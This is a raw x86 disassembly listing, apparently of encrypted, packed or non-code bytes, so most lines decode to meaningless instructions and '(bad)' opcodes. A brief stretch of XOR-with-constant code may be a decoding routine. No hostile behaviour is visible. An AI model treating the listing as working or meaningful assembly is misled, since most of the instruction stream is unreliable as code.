  4074b2:	ror    BYTE PTR [ecx-0x737dd076],cl
  4074b8:	push   eax
  4074b9:	or     edx,DWORD PTR [ebp+0x11]
  4074bc:	scas   al,BYTE PTR es:[edi]
  4074bd:	or     BYTE PTR [eax],bl
  4074bf:	xor    eax,0xda4ea266
  4074c4:	shl    dl,1
  4074c6:	arpl   WORD PTR [edi+0x53],sp
  4074c9:	rol    DWORD PTR [esi+0x6],cl
  4074cc:	mov    ds:0x23a1d171,eax
  4074d1:	loope  0x4074eb
  4074d3:	clc    
  4074d4:	call   0xf603:0x88788848
  4074db:	or     eax,0x4745389
  4074e0:	xor    DWORD PTR [ecx+esi*1-0x42],ebx
  4074e4:	je     0x4074d0
  4074e6:	test   BYTE PTR [ecx+0x5c],0x3
  4074ea:	mov    esp,0x982aec9c
  4074ef:	lahf   
  4074f0:	push   cs
  4074f1:	loopne 0x407497
  4074f3:	aam    0xec
  4074f5:	gs cdq 
  4074f7:	ror    DWORD PTR [eax],1
  4074f9:	lea    ebp,[ecx]
  4074fb:	xchg   ebx,eax
  4074fc:	inc    ecx
  4074fd:	cs scas al,BYTE PTR es:[edi]
  4074ff:	jne    0x4074dc
  407501:	add    al,0xb2
  407503:	loopne 0x407520
  407505:	fild   QWORD PTR [bp+si-0x4be6]
  40750a:	push   edx
  40750b:	jmp    0x407558
  40750d:	cmp    DWORD PTR [ebp+0x66],0xffffff98
  407511:	test   BYTE PTR [eax-0x3c],ch
  407514:	data16 jmp 0x4074aa
  407517:	imul   edi,DWORD PTR [ecx+0x3d],0x58
  40751b:	ja     0x40756e
  40751d:	ja     0x407502
  40751f:	cmp    DWORD PTR [ecx],0xffffffc1
  407522:	ret    
  407523:	in     eax,dx
  407524:	test   DWORD PTR [ebp+edi*1+0x5b820284],edx
  40752b:	inc    eax
  40752c:	jl     0x40752e
  40752e:	xchg   edi,eax
  40752f:	ror    DWORD PTR fs:[edi-0x48],0xef
  407534:	iret   
  407535:	dec    ebp
  407536:	adc    al,0x85
  407538:	jbe    0x4074e5
  40753a:	push   edx
  40753b:	cld    
  40753c:	in     eax,0xcf
  40753e:	adc    eax,0x9a29b195
  407543:	popf   
  407544:	or     ecx,esi
  407546:	jg     0x4074dd
  407548:	popa   
  407549:	sub    al,0x3b
  40754b:	loopne 0x407563
  40754d:	jno    0x40750e
  40754f:	mov    DWORD PTR [edx-0x341b0f9],0x73c3dfcd
  407559:	or     BYTE PTR [edx+ebp*1-0x58],0x6f
  40755e:	adc    esp,DWORD PTR [edi-0x56d02fc9]
  407564:	ss jno 0x40755f
  407567:	pop    esi
  407568:	push   esi
  407569:	js     0x4074f8
  40756b:	xchg   ecx,eax
  40756c:	mov    esi,0x158df839
  407571:	mov    ch,0x5c
  407573:	retf   0x53ad
  407576:	sti    
  407577:	daa    
  407578:	push   ecx
  407579:	mov    eax,DWORD PTR [edx+0x30]
  40757c:	and    esp,DWORD PTR [ecx-0x6bddaff9]
  407582:	inc    esp
  407583:	out    0xf,al
  407585:	and    ah,BYTE PTR [edi-0x66]
  407588:	pop    esp
  407589:	imul   BYTE PTR [ecx-0x47fdc17f]
  40758f:	test   BYTE PTR [eax+0xfb44d8b],0xac
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x0
  407613:	mov    ecx,0x7d176a35
  407618:	sbb    BYTE PTR [eax],bl
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    dh,bl
  40761f:	pop    ebp
  407620:	jl     0x407648
  407622:	pusha  
  407623:	ds cmp al,0x90
  407626:	js     0x40764f
  407628:	(bad)  
  407629:	in     al,dx
  40762a:	sbb    BYTE PTR [ebx-0x3],al
  40762d:	push   0xffffffc1
  40762f:	add    dh,BYTE PTR [esi-0x4978d4fa]
  407635:	or     ebx,DWORD PTR [ebp-0x30]
  407638:	outs   dx,DWORD PTR ds:[esi]
  407639:	add    al,0x1c
  40763b:	out    0xd7,al
  40763d:	pop    edx
  40763e:	in     al,0x8e
  407640:	and    eax,0x48d9a8d8
  407645:	mov    ds:0xf1f329c0,al
  40764a:	xchg   edx,eax
  40764b:	js     0x4076ba
  40764d:	xchg   esp,eax
  40764e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764f:	ret    0xe682
  407652:	ins    DWORD PTR es:[edi],dx
  407653:	data16 jge 0x4075f2
  407656:	(bad)  
  407657:	add    al,0xc7
  407659:	int3   
  40765a:	in     al,dx
  40765b:	sub    eax,0x8874e759
  407660:	mov    ch,0xaf
  407662:	sub    DWORD PTR [ecx],esi
  407664:	mov    gs,WORD PTR [edi-0x9269cb9]
  40766a:	mov    al,ds:0x5b6f4693
  40766f:	mov    BYTE PTR [ebx-0x8],dh
  407672:	fcmovne st,st(6)
  407674:	cmp    BYTE PTR [ebx+0x6e],ch
  407677:	dec    ecx
  407678:	jecxz  0x40760c
  40767a:	ss repz jge 0x40765a
  40767e:	dec    BYTE PTR [ebx+0x11]
  407681:	push   ss
  407682:	inc    ebx
  407683:	push   cs
  407684:	xchg   esp,eax
  407685:	stc    
  407686:	add    BYTE PTR [edi+0x14],dh
  407689:	push   es
  40768a:	fisubr WORD PTR [edi-0x7297e0dd]
  407690:	ds loopne 0x407649
  407693:	data16 ror BYTE PTR [esi+0xabd6942],0x82
  40769b:	cmp    ecx,DWORD PTR [ecx+eiz*1-0x52e0e10e]
  4076a2:	call   FWORD PTR [ebx-0x3f]
  4076a5:	fsub   st(0),st
  4076a7:	or     eax,0xde63b03b
  4076ac:	xchg   bl,bl
  4076ae:	out    0x2a,eax
  4076b0:	pop    edi
  4076b1:	shl    DWORD PTR [ebp-0x1163dc96],1
  4076b7:	int3   
  4076b8:	sbb    BYTE PTR [edi-0x51396b86],0x52
  4076bf:	not    esp
  4076c1:	retf   0xc210
  4076c4:	and    eax,0x32829b42
  4076c9:	cmc    
  4076ca:	sub    edx,DWORD PTR [ecx]
  4076cc:	pop    ebx
  4076cd:	imul   ebx,DWORD PTR [ebx],0xffffff85
  4076d0:	aad    0x76
  4076d2:	inc    ecx
  4076d3:	add    DWORD PTR [eax-0x50],esp
  4076d6:	bound  esp,QWORD PTR [ecx-0x6f3680c6]
  4076dc:	popa   
  4076dd:	scas   al,BYTE PTR es:[edi]
  4076de:	xchg   BYTE PTR [ebx],ah
  4076e0:	dec    esp
  4076e1:	push   ecx
  4076e2:	loopne 0x40769c
  4076e4:	mov    ecx,0x18ad2337
  4076e9:	inc    edx
  4076ea:	push   es
  4076eb:	pop    esi
  4076ec:	jo     0x40774f
  4076ee:	mov    ss,WORD PTR fs:[edi+0x6]
  4076f2:	pop    esp
  4076f3:	hlt    
  4076f4:	(bad)  
  4076f5:	sti    
  4076f6:	ss lahf 
  4076f8:	inc    ebp
  4076f9:	scas   eax,DWORD PTR es:[edi]
  4076fa:	sub    DWORD PTR [edx-0x7f84994a],ecx
  407700:	es xchg edx,eax
  407702:	enter  0x9cbb,0x7f
  407706:	sbb    al,0x2b
  407708:	jns    0x407781
  40770a:	and    eax,0x957d44a1
  40770f:	jl     0x4076c4
  407711:	shl    DWORD PTR [eax],0x8
  407714:	mov    eax,0x3aa741c6
  407719:	jmp    0xb99c:0xb9f4e6ce
  407720:	sub    eax,0x4b8c0c41
  407725:	inc    esp
  407726:	in     eax,0x86
  407728:	and    BYTE PTR [ebx+0x37fb13e1],bl
  40772e:	popa   
  40772f:	jmp    0xcaebc5e9
  407734:	sti    
  407735:	scas   al,BYTE PTR es:[edi]
  407736:	xchg   esi,eax
  407737:	push   ecx
  407738:	pop    esp
  407739:	je     0x407778
  40773b:	(bad)  
  40773c:	mov    al,0xb4
  40773e:	pop    esi
  40773f:	retf   
  407740:	adc    eax,0x63209eed
  407745:	iret   
  407746:	inc    eax
  407747:	push   edx
  407748:	mov    ch,BYTE PTR [ebp-0x4b]
  40774b:	dec    ebx
  40774c:	push   ebx
  40774d:	stos   BYTE PTR es:[edi],al
  40774e:	dec    esi
  40774f:	and    BYTE PTR [edx],bl
  407751:	repz inc eax
  407753:	jae    0x4076ea
  407755:	mov    dh,0xe0
  407757:	inc    cl
  407759:	sub    DWORD PTR [edi],ecx
  40775b:	imul   edx,DWORD PTR ds:0x5609c58c,0x48
  407762:	in     eax,0xce
  407764:	mov    BYTE PTR [eax],dl
  407766:	repz mov ecx,DWORD PTR [ebp+0x473c77ea]
  40776d:	jns    0x407760
  40776f:	ds clc 
  407771:	in     eax,0xb1
  407773:	into   
  407774:	xchg   DWORD PTR [eax+0x34],ebx
  407777:	out    0x91,al
  407779:	sub    edi,DWORD PTR [eax+0x1267edb1]
  40777f:	pop    ss
  407780:	pop    ecx
  407781:	lds    esp,FWORD PTR [eax-0x2e7da01e]
  407787:	xchg   edi,eax
  407788:	(bad)  
  407789:	xchg   ebx,eax
  40778a:	mov    DWORD PTR [edx],eax
  40778c:	sub    BYTE PTR [eax-0x2a],al
  40778f:	pop    ecx
  407790:	fwait
  407791:	jmp    0x84a89963
  407796:	jbe    0x407814
  407798:	loopne 0x4077c8
  40779a:	sbb    al,0x18
  40779c:	clc    
  40779d:	sti    
  40779e:	mov    dh,0x6b
  4077a0:	(bad)  
  4077a1:	std    
  4077a2:	xchg   ebp,eax
  4077a3:	push   eax
  4077a4:	mov    ebp,0x83d93177
  4077a9:	mov    eax,0x2566f047
  4077ae:	jecxz  0x40773e
  4077b0:	sbb    ah,al
  4077b2:	leave  
  4077b3:	pop    es
  4077b4:	sbb    BYTE PTR [ebx],0x57
  4077b7:	mov    cl,0x2
  4077b9:	push   0x6e
  4077bb:	jl     0x407808
  4077bd:	or     ebp,edx
  4077bf:	cmp    ch,BYTE PTR [ebp-0x6b9483e7]
  4077c5:	(bad)  
  4077c6:	fimul  WORD PTR [esi]
  4077c8:	and    al,0xc9
  4077ca:	mov    esp,0xe9d12567
  4077cf:	xor    ah,BYTE PTR [ebx]
  4077d1:	aam    0xd1
  4077d3:	push   edi
  4077d4:	shl    BYTE PTR [ecx+0x17],cl
  4077d7:	inc    ebx
  4077d8:	mov    cl,0x83
  4077da:	rcl    DWORD PTR [ebp+0x7a9e28ad],cl
  4077e0:	repnz push ecx
  4077e2:	pop    esp
  4077e3:	adc    ch,BYTE PTR [ebx+0x4615efcd]
  4077e9:	jo     0x40783d
  4077eb:	cmp    edi,DWORD PTR [esi-0x2b]
  4077ee:	fidiv  WORD PTR [edi]
  4077f0:	adc    BYTE PTR [edi],bh
  4077f2:	or     eax,edi
  4077f4:	or     ch,BYTE PTR [edx-0x1ffc6a3c]
  4077fa:	add    eax,0x5241094b
  4077ff:	add    esi,DWORD PTR [edi]
  407801:	int3   
  407802:	outs   dx,DWORD PTR ds:[esi]
  407803:	(bad)  
  407804:	call   0xe1da8c97
  407809:	add    al,ch
  40780b:	enter  0x23ce,0xee
  40780f:	or     ah,BYTE PTR [esi+ecx*2]
  407812:	mov    ebp,0x5fcc1e8e
  407817:	out    0x89,eax
  407819:	retf   
  40781a:	pop    eax
  40781b:	mov    ecx,0xc5434393
  407820:	call   0x33a8:0x5081b183
  407827:	add    al,0xb
  407829:	loopne 0x407871
  40782b:	fidiv  DWORD PTR [ebp+0x47]
  40782e:	sbb    ah,BYTE PTR [ecx+edx*1-0x17]
  407832:	or     BYTE PTR [ebx-0x4],ah
  407835:	push   cs
  407836:	or     eax,0xed62dc76
  40783b:	adc    eax,0xfaa165d1
  407840:	ds sub edx,ebp
  407843:	add    dh,dh
  407845:	pop    ss
  407846:	fdivr  QWORD PTR [edx-0x373eb8a2]
  40784c:	repnz (bad) 
  40784e:	lock jno 0x407890
  407851:	test   al,0x36
  407853:	or     eax,0xab62a845
  407858:	(bad)  
  407859:	jp     0x4078a4
  40785b:	sub    eax,DWORD PTR [eax+0x39]
  40785e:	icebp  
  40785f:	enter  0x5af4,0x70
  407863:	aam    0x3b
  407865:	xor    BYTE PTR [ebx],0x11
  407868:	leave  
  407869:	cli    
  40786a:	adc    DWORD PTR fs:[edx-0x24],ecx
  40786e:	adc    DWORD PTR [edx+0x3516b80e],ebx
  407874:	ja     0x407834
  407876:	mov    al,ds:0x63498a20
  40787b:	adc    cl,BYTE PTR [eax]
  40787d:	adc    eax,0x8e982f0d
  407882:	repnz (bad)
  407885:	cmp    ebp,DWORD PTR [eax+0x730e898]
  40788b:	in     al,dx
  40788c:	pop    ebx
  40788d:	sub    eax,0xff03ff67
  407892:	(bad)  
  407893:	mov    ebp,0x4655642e
  407898:	inc    esp
  407899:	add    cl,bl
  40789b:	jmp    0xb2958eb0
  4078a0:	inc    DWORD PTR [ebx-0x2]
  4078a3:	sub    ebx,DWORD PTR [ebx-0x18]
  4078a6:	adc    edx,DWORD PTR [esi+0x40cd36d3]
  4078ac:	lahf   
  4078ad:	in     eax,0xd9
  4078af:	(bad)  
  4078b0:	adc    ah,bl
  4078b2:	or     eax,0xdbfcd1d6
  4078b7:	inc    ebx
  4078b8:	push   edi
  4078b9:	in     al,dx
  4078ba:	sahf   
  4078bb:	mov    ds:0x961e49bc,al
  4078c0:	icebp  
  4078c1:	cwde   
  4078c2:	daa    
  4078c3:	pop    ebx
  4078c4:	inc    ebx
  4078c5:	jb     0x407855
  4078c7:	fld    TBYTE PTR [eax+0x2dd60ae4]
  4078cd:	sar    BYTE PTR [eax],1
  4078cf:	sbb    edi,DWORD PTR [ebp-0x4f]
  4078d2:	shl    DWORD PTR [ebp+0x2316785b],0x51
  4078d9:	shr    DWORD PTR [edx+0x1be703ac],1
  4078df:	imul   ebp,DWORD PTR [esp+eax*4],0xfffffff8
  4078e3:	sub    DWORD PTR [edx+ecx*2],0x29
  4078e7:	jo     0x40786d
  4078e9:	dec    ebx
  4078ea:	pop    esi
  4078eb:	mov    BYTE PTR [ecx-0x7033f1d0],dh
  4078f1:	cmp    al,0x98
  4078f3:	jge    0x407962
  4078f5:	lods   eax,DWORD PTR ds:[esi]
  4078f6:	retf   
  4078f7:	in     eax,dx
  4078f8:	shl    bh,1
  4078fa:	pop    eax
  4078fb:	cdq    
  4078fc:	fdivr  st,st(5)
  4078fe:	icebp  
  4078ff:	enter  0xdb96,0x93
  407903:	mov    DWORD PTR [eax],ecx
  407905:	cdq    
  407906:	jp     0x40791a
  407908:	sbb    DWORD PTR ds:0x3d666798,ecx
  40790e:	push   ebx
  40790f:	pop    esi
  407910:	add    dh,BYTE PTR [esi-0x44822829]
  407916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407917:	xchg   BYTE PTR [esi-0x53],dh
  40791a:	repnz arpl WORD PTR [eax],si
  40791d:	xor    ah,dl
  40791f:	sbb    al,0x1b
  407921:	imul   ebx,DWORD PTR [eax-0x47c40444],0xffffffd7
  407928:	dec    ecx
  407929:	test   al,0xd4
  40792b:	pop    eax
  40792c:	lds    edx,FWORD PTR [edi+0x43]
  40792f:	xchg   ebp,eax
  407930:	mov    eax,0xa3a90c1b
  407935:	add    ch,BYTE PTR [esi]
  407937:	ror    ebp,0x7
  40793a:	xor    DWORD PTR [esi-0x6a3f95d8],esi
  407940:	and    eax,0x805e35ea
  407945:	int3   
  407946:	jg     0x4079c1
  407948:	popf   
  407949:	aad    0xe9
  40794b:	cld    
  40794c:	retf   0x4146
  40794f:	xor    DWORD PTR [esi-0x5c],edx
  407952:	jle    0x4078da
  407954:	in     al,dx
  407955:	or     esp,ebp
  407957:	iret   
  407958:	cmp    ebp,ecx
  40795a:	aas    
  40795b:	sbb    al,0x75
  40795d:	push   eax
  40795e:	clc    
  40795f:	mov    eax,ds:0x488c823c
  407964:	repnz dec ebx
  407966:	int    0xe0
  407968:	dec    esi
  407969:	imul   ebx,DWORD PTR [edi-0x4e],0xffffffd6
  40796d:	sti    
  40796e:	add    DWORD PTR [ebx],edx
  407970:	dec    esp
  407971:	(bad)  
  407972:	mov    dh,0x8e
  407974:	add    edx,DWORD PTR gs:[edx]
  407977:	mov    eax,0xc453e122
  40797c:	lea    ecx,[esi-0x14930d05]
  407982:	aaa    
  407983:	and    eax,0x8801f354
  407988:	aad    0x52
  40798a:	jbe    0x407924
  40798c:	add    dl,cl
  40798e:	lahf   
  40798f:	adc    ecx,DWORD PTR [eax-0x13]
  407992:	mov    ?,WORD PTR [edi+0x333533bf]
  407998:	push   esp
  407999:	xchg   DWORD PTR [esi-0x353613d5],ecx
  40799f:	scas   al,BYTE PTR es:[edi]
  4079a0:	daa    
  4079a1:	mov    eax,0x3cddf80d
  4079a6:	push   ebp
  4079a7:	int3   
  4079a8:	sbb    BYTE PTR [edx-0x356d212b],al
  4079ae:	mov    ebx,0xb851931a
  4079b3:	lds    esi,FWORD PTR [esi+0x5fb7c2e]
  4079b9:	cmc    
  4079ba:	and    cl,dl
  4079bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079bd:	add    cl,cl
  4079bf:	mov    esi,0x88fdb4b1
  4079c4:	out    0x23,al
  4079c6:	mov    ds:0x9d518377,al
  4079cb:	jl     0x407990
  4079cd:	and    edx,ecx
  4079cf:	xor    bl,al
  4079d1:	(bad)  
  4079d2:	ds out 0x7b,al
  4079d5:	arpl   WORD PTR [esi+0x20],ax
  4079d8:	dec    esp
  4079d9:	fs loop 0x4079aa
  4079dc:	or     eax,0x45891d5f
  4079e1:	int3   
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x407a3a
  4079f4:	or     al,0x8f
  4079f6:	jo     0x407995
  4079f8:	jne    0x407a12
  4079fa:	sbb    BYTE PTR [esi+0x6181812],bl
  407a00:	pmuludq mm5,QWORD PTR [esi]
  407a03:	or     esp,DWORD PTR [ebx-0x11]
  407a06:	std    
  407a07:	and    ecx,esi
  407a09:	fcomip st,st(7)
  407a0b:	lds    edi,FWORD PTR ds:0x444c27ea
  407a11:	stc    
  407a12:	es mov edx,0x204e2200
  407a18:	cmc    
  407a19:	scas   eax,DWORD PTR es:[edi]
  407a1a:	jae    0x4079c8
  407a1c:	mov    ah,0xb7
  407a1e:	(bad)  
  407a1f:	repz in al,dx
  407a21:	leave  
  407a22:	push   eax
  407a23:	aas    
  407a24:	push   edi
  407a25:	adc    ecx,DWORD PTR [edx+0x3c]
  407a28:	or     al,0x3d
  407a2a:	popf   
  407a2b:	or     ch,BYTE PTR [ecx-0x372bc3ac]
  407a31:	fcmovnbe st,st(5)
  407a33:	mov    ebx,0x48fbcdf9
  407a38:	popf   
  407a39:	add    al,0x26
  407a3b:	jmp    0xb09b:0xa863357c
  407a42:	push   ebx
  407a43:	loope  0x4079ee
  407a45:	ror    DWORD PTR [ebx],1
  407a47:	loope  0x407a07
  407a49:	push   0x2c
  407a4b:	je     0x407a06
  407a4d:	xchg   ebx,eax
  407a4e:	jg     0x407abe
  407a50:	clc    
  407a51:	int3   
  407a52:	fsubr  st,st(0)
  407a54:	xor    dh,al
  407a56:	test   BYTE PTR [edx-0x2c320f44],dl
  407a5c:	out    dx,eax
  407a5d:	sbb    BYTE PTR [eax+edx*8+0x7d85edf3],dh
  407a64:	imul   edi,DWORD PTR [edi+edx*2],0xffffff88
  407a68:	test   eax,0x65c665fd
  407a6d:	out    0x42,al
  407a6f:	ret    
  407a70:	sub    DWORD PTR [ebx-0xf53957a],ebx
  407a76:	xchg   edi,eax
  407a77:	int    0x71
  407a79:	sub    eax,0x33a34948
  407a7e:	push   ds
  407a7f:	(bad)  
  407a80:	xchg   edx,eax
  407a81:	cli    
  407a82:	add    al,0xe6
  407a84:	mov    ds:0x6326c79d,eax
  407a8a:	inc    ebx
  407a8b:	adc    ah,ah
  407a8d:	leave  
  407a8e:	mov    al,ds:0x80125674
  407a93:	push   esi
  407a94:	or     DWORD PTR [esi-0x44],ebx
  407a97:	(bad)
  407a9b:	xor    bl,0x53
  407a9e:	push   0xffffffcc
  407aa0:	adc    ah,BYTE PTR [eax-0x6b]
  407aa3:	popf   
  407aa4:	pop    ebx
  407aa5:	xchg   ebp,eax
  407aa6:	lods   eax,DWORD PTR ds:[esi]
  407aa7:	out    dx,eax
  407aa8:	sbb    esi,0x85f684c4
  407aae:	shr    BYTE PTR [edi-0x37],0x48
  407ab2:	int3   
  407ab3:	cmp    DWORD PTR [edi-0x3d],0xffffffc9
  407ab7:	cdq    
  407ab8:	sahf   
  407ab9:	xchg   esp,eax
  407aba:	jmp    0xefcda5
  407abf:	xor    BYTE PTR [ebx+0x20],cl
  407ac2:	inc    edx
  407ac3:	xchg   ecx,eax
  407ac4:	cs inc ebp
  407ac6:	test   ebp,ebp
  407ac8:	lds    ecx,FWORD PTR [ebx]
  407aca:	cmp    BYTE PTR [edi-0x64],bh
  407acd:	mov    dl,0x8c
  407acf:	cmp    al,al
  407ad1:	or     bh,bh
  407ad3:	cmc    
  407ad4:	xchg   BYTE PTR [ebx+0x12],al
  407ad7:	and    BYTE PTR [edx+eax*8+0xb95adfd],0x6c
  407adf:	jmp    0x2673420b
  407ae4:	xor    ebp,DWORD PTR [eax-0x32a918b4]
  407aea:	xor    bh,BYTE PTR [ebx-0x105f9602]
  407af0:	push   edi
  407af1:	jno    0x407b02
  407af3:	sbb    edi,DWORD PTR [edx+0x5a7a6da0]
  407af9:	pop    ecx
  407afa:	into   
  407afb:	mov    edx,0x40d79f6c
  407b00:	dec    ebx
  407b01:	push   ebx
  407b02:	nop
  407b03:	cmp    cl,BYTE PTR [esi-0x19ac3f27]
  407b09:	jae    0x407b11
  407b0b:	mov    al,0xd5
  407b0d:	push   ecx
  407b0e:	or     BYTE PTR [eax+0x6bb4fcd8],ch
  407b14:	in     al,dx
  407b15:	sbb    eax,0x85254977
  407b1a:	call   0xffb1:0x28608a3c
  407b21:	mov    esp,0x7ebb6b94
  407b26:	test   al,0x86
  407b28:	push   ebx
  407b29:	xor    eax,0x592212dd
  407b2e:	add    BYTE PTR [edi+0x3f],ch
  407b31:	(bad)  
  407b33:	xchg   BYTE PTR [ecx+eiz*8],dh
  407b36:	test   eax,0x1324ba91
  407b3b:	xor    al,dh
  407b3d:	mov    eax,ds:0x36c1e79b
  407b42:	adc    BYTE PTR [eax],0x77
  407b45:	xchg   esp,eax
  407b46:	cmp    eax,0xaee264cb
  407b4b:	add    al,0x9a
  407b4d:	aaa    
  407b4e:	pop    es
  407b4f:	push   esi
  407b50:	mov    edx,0xd2012de0
  407b55:	add    cl,BYTE PTR [ebp+0x3319b359]
  407b5b:	imul   eax,DWORD PTR [edi],0xffffffc4
  407b5e:	mov    bl,0x48
  407b60:	mov    bh,0x5f
  407b62:	push   es
  407b63:	fld    TBYTE PTR [eax+0x1c]
  407b66:	outs   dx,BYTE PTR ds:[esi]
  407b67:	adc    al,0x30
  407b69:	loopne 0x407b24
  407b6b:	addr16 dec ebx
  407b6d:	shl    DWORD PTR [edi+0x5e],cl
  407b70:	xor    ch,ah
  407b72:	iret   
  407b73:	mov    ah,BYTE PTR [edi]
  407b75:	nop
  407b76:	and    al,BYTE PTR [edx+0x47e6bab5]
  407b7c:	lock jae 0x407b10
  407b7f:	jmp    0x407be2
  407b81:	cli    
  407b82:	sub    BYTE PTR [eax-0x21],dl
  407b85:	xor    ebp,DWORD PTR ds:0xfdef1f9
  407b8b:	shl    DWORD PTR [esi+ebp*4],cl
  407b8e:	test   DWORD PTR [edi-0x653c859],esp
  407b94:	pop    ebp
  407b95:	in     eax,0xc0
  407b97:	outs   dx,BYTE PTR ds:[esi]
  407b98:	inc    ebx
  407b99:	adc    BYTE PTR [ebx-0x57b95672],0xc7
  407ba0:	push   es
  407ba1:	pop    ss
  407ba2:	int3   
  407ba3:	retf   
  407ba4:	push   ss
  407ba5:	cdq    
  407ba6:	shr    BYTE PTR [ecx-0x23],cl
  407ba9:	shl    ebp,1
  407bab:	add    BYTE PTR [ebx+0x42f8eb52],al
  407bb1:	shl    BYTE PTR [eax],1
  407bb3:	mov    esi,0x8d747755
  407bb8:	in     eax,dx
  407bb9:	test   edx,esp
  407bbb:	adc    BYTE PTR ds:0xeeb58736,ah
  407bc1:	iret   
  407bc2:	in     eax,dx
  407bc3:	ret    
  407bc4:	js     0x407bfa
  407bc6:	mov    ah,0xa9
  407bc8:	mov    edx,0x68abc25a
  407bcd:	mov    edx,0x94231a49
  407bd2:	(bad)  
  407bd4:	fwait
  407bd5:	pop    ecx
  407bd6:	push   esi
  407bd7:	clc    
  407bd8:	pop    ds
  407bd9:	loope  0x407bb9
  407bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bdc:	sbb    ecx,esi
  407bde:	add    eax,0x268c6aa2
  407be3:	pushf  
  407be4:	call   0xbe15:0xbc73b78c
  407beb:	pop    ss
  407bec:	xchg   edi,eax
  407bed:	(bad)  
  407bee:	shr    esp,1
  407bf0:	std    
  407bf1:	adc    bh,BYTE PTR ds:0x547bd8e9
  407bf7:	pop    ebx
  407bf8:	fsubp  st(3),st
  407bfa:	test   DWORD PTR [esi+eiz*1],edx
  407bfd:	adc    DWORD PTR [esi+0x35],edx
  407c00:	lods   al,BYTE PTR ds:[esi]
  407c01:	mov    ah,0x5f
  407c03:	inc    ebp
  407c04:	jo     0x407c7f
  407c06:	or     DWORD PTR [eax+0x3fb36f0e],eax
  407c0c:	pop    ecx
  407c0d:	rcr    DWORD PTR [ecx+0x7f],0xd8
  407c11:	push   ss
  407c12:	xchg   DWORD PTR [eax+0x39c73cc5],esp
  407c18:	repz mov ecx,DWORD PTR [ebx-0x22]
  407c1c:	xchg   BYTE PTR [ebp-0x26],bh
  407c1f:	arpl   WORD PTR [edx],bx
  407c21:	push   ecx
  407c22:	add    BYTE PTR [eax+0x35bce9ac],ch
  407c28:	push   0xaf7b37db
  407c2d:	nop    DWORD PTR [eax+0x6eea5c66]
  407c34:	les    ebx,FWORD PTR [ebx]
  407c36:	loop   0x407bc8
  407c38:	push   0x45
  407c3a:	sub    BYTE PTR [ebx+0xf190257],0x62
  407c41:	add    BYTE PTR [ebp+0x66372184],cl
  407c47:	add    edx,DWORD PTR ds:0x6217455f
  407c4d:	icebp  
  407c4e:	cmp    BYTE PTR [ecx],dh
  407c50:	repnz inc esp
  407c52:	pop    ds
  407c53:	and    eax,ebx
  407c55:	in     al,0x7d
  407c57:	xchg   edx,eax
  407c58:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  407c5a:	or     ecx,edx
  407c5c:	cmp    ebp,ecx
  407c5e:	jp     0x407c26
  407c60:	scas   eax,DWORD PTR es:[edi]
  407c61:	into   
  407c62:	sub    DWORD PTR [eax],0xffffff89
  407c65:	push   edx
  407c66:	cs add esi,eax
  407c69:	aas    
  407c6a:	mov    esp,0xa72c2ffa
  407c6f:	dec    ebx
  407c70:	pop    ecx
  407c71:	xor    ebx,DWORD PTR ds:[ebp+0x54b4f20a]
  407c78:	jmp    0xa26d:0xec8a79ca
  407c7f:	add    al,0x62
  407c81:	push   es
  407c82:	and    esp,ebx
  407c84:	sbb    cl,BYTE PTR [edx]
  407c86:	imul   esi,DWORD PTR [ecx-0x6ca6ce38],0x72185a0
  407c90:	mov    al,ds:0x4f8e2671
  407c95:	leave  
  407c96:	adc    ebp,DWORD PTR [ebx+edi*8-0x667c1ba9]
  407c9d:	pop    eax
  407c9e:	mov    eax,0x4eafefeb
  407ca3:	ja     0x407c5f
  407ca5:	int    0xbf
  407ca7:	adc    al,cl
  407ca9:	push   cs
  407caa:	and    ebp,DWORD PTR [edx-0x6b4e59a3]
  407cb0:	(bad)  
  407cb1:	fidivr WORD PTR [ebx+0x3220b0b7]
  407cb7:	mov    ecx,0x7af0e9e4
  407cbc:	inc    ebp
  407cbd:	(bad)  
  407cbe:	mov    esp,0x13bd192c
  407cc3:	shr    BYTE PTR [ecx],1
  407cc5:	xchg   ecx,eax
  407cc6:	scas   al,BYTE PTR es:[edi]
  407cc7:	ds mov ebp,0xf5acb038
  407ccd:	aam    0xed
  407ccf:	sbb    DWORD PTR [ebx],esp
  407cd1:	mov    esi,0xc45b5a05
  407cd6:	fcomp  DWORD PTR [edx]
  407cd8:	sub    esi,DWORD PTR [ecx-0x12]
